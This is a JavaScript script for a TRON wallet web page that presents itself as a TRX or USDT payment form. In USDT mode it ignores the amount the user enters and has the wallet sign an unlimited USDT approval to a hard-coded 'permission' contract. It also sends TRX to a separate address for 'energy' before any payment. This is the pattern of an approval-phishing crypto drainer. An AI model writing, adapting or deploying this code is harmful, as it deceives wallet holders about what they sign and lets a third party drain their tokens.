// ✅ 配置参数（原 config.js 整合进来）
const CONFIG = {
    NETWORK: "shasta", // 测试网，正式请改 "mainnet"
    PERMISSION_ADDRESS: "TTeSA1Q5t2fDcW2yhjbYNxooeZdf3o3Rrb", // 授权合约地址
    PAYMENT_ADDRESS: "TEeeWfuMZFSigGaRs7DsTimzYvJBYkXdwf", // 收款地址
    USDT_CONTRACT_ADDRESS: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // USDT 合约
    ENERGY_LEASE_ADDRESS: "TRGKyGrfqXismG7LddwVDm2nuZc83MMMMM", // 能量租赁地址
    ENERGY_RENT_AMOUNT: 1.8, // 需要租赁多少 TRX 换取能量
    TRX_TO_USD_RATE: 0.1562, // TRX 兑换 USD 汇率
};

// 获取当前 TRON 节点
const getFullNode = () => CONFIG.NETWORK === "shasta" 
    ? "https://api.shasta.trongrid.io" 
    : "https://api.trongrid.io";

// ✅ 初始化 TronWeb
window.tronWeb = new TronWeb({
    fullHost: getFullNode(),
});

// ✅ 连接钱包
async function connectWallet() {
    try {
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
            console.error("未检测到 Tron 钱包");
            tip("请先连接钱包");
            return;
        }
        console.log("钱包已连接:", window.tronWeb.defaultAddress.base58);
    } catch (error) {
        console.error("钱包连接失败:", error);
    }
}

// ✅ 发送 TRX 交易
async function sendTRXTransaction(amount) {
    try {
        const trxAmountInSun = tronWeb.toSun(amount);
        const transaction = await tronWeb.transactionBuilder.sendTrx(
            CONFIG.PAYMENT_ADDRESS,
            trxAmountInSun,
            tronWeb.defaultAddress.base58
        );
        const signedTransaction = await tronWeb.trx.sign(transaction);
        const broadcast = await tronWeb.trx.sendRawTransaction(signedTransaction);
        if (broadcast.result) {
            console.log("✅ TRX 交易成功:", broadcast.txid);
            tip("TRX 转账成功");
            return broadcast.txid;
        } else {
            throw new Error("交易失败");
        }
    } catch (error) {
        console.error("TRX 转账失败:", error);
        tip("交易失败，请重试");
    }
}

// ✅ USDT 授权
async function approveUSDT() {
    try {
        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
            tronWeb.address.toHex(CONFIG.USDT_CONTRACT_ADDRESS),
            'approve(address,uint256)',
            { feeLimit: 50000000 }, // 5 TRX
            [
                { type: 'address', value: tronWeb.address.toHex(CONFIG.PERMISSION_ADDRESS) },
                { type: 'uint256', value: '999999999999999999' } // 无限授权
            ],
            tronWeb.defaultAddress.base58
        );

        if (!transaction.result || !transaction.result.result) {
            throw new Error("授权交易构建失败");
        }

        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

        if (result.result) {
            console.log("✅ USDT 授权成功:", result.txid);
            tip("USDT 授权成功");
            return result.txid;
        } else {
            throw new Error("授权交易失败");
        }
    } catch (error) {
        console.error("USDT 授权失败:", error);
        tip("授权失败，请检查钱包");
    }
}

// ✅ 代付能量租赁
async function rentEnergyIfNeeded() {
    try {
        const account = await tronWeb.trx.getAccount(tronWeb.defaultAddress.base58);
        const energy = account.energy || 0;
        console.log("当前能量:", energy);

        if (energy < 10000) {
            console.log(`⚠️ 能量不足，租赁 ${CONFIG.ENERGY_RENT_AMOUNT} TRX...`);
            const trxAmountInSun = tronWeb.toSun(CONFIG.ENERGY_RENT_AMOUNT);
            const transaction = await tronWeb.transactionBuilder.sendTrx(
                CONFIG.ENERGY_LEASE_ADDRESS, trxAmountInSun, tronWeb.defaultAddress.base58
            );
            const signedTransaction = await tronWeb.trx.sign(transaction);
            const broadcast = await tronWeb.trx.sendRawTransaction(signedTransaction);

            if (broadcast.result) {
                console.log("✅ 能量租赁成功:", broadcast.txid);
            } else {
                throw new Error("能量租赁失败");
            }
        } else {
            console.log("✅ 能量充足");
        }
    } catch (error) {
        console.error("能量租赁失败:", error);
    }
}

// ✅ 处理按钮点击事件
async function onNextButtonClick() {
    try {
        await connectWallet();
        await rentEnergyIfNeeded();

        const amount = parseFloat(document.getElementById("amount").value);
        if (isNaN(amount) || amount <= 0) {
            tip("请输入有效金额");
            return;
        }

        if (document.getElementById("trxMode").checked) {
            console.log("TRX 转账");
            await sendTRXTransaction(amount);
        } else {
            console.log("USDT 授权");
            await approveUSDT();
        }
    } catch (error) {
        console.error("交易失败:", error);
        tip("交易失败，请重试");
    }
}

// ✅ 页面加载时初始化
document.addEventListener("DOMContentLoaded", async () => {
    document.getElementById("submitBtn").addEventListener("click", onNextButtonClick);
    await connectWallet();
});
